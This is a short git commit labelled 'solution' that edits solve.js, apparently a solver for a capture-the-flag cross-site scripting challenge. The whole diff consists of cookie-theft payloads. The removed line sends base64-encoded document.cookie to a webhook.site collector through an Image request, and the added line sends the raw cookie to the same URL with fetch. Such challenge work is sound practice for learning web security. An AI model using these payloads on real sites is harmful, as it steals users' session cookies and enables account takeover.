5d76ca5862975556bd1bdcc4fc06a497ee5d5dd4
bokkisec <joshchung02@gmail.com>
2024-08-08 02:04:03 -0400

    solution

--- solve.js
+++ solve.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/e80c2d1c-037b-4d48-87e7-ca76e04cf587?data='+btoa(document.cookie);
+fetch('https://webhook.site/e80c2d1c-037b-4d48-87e7-ca76e04cf587?c=' + document.cookie)
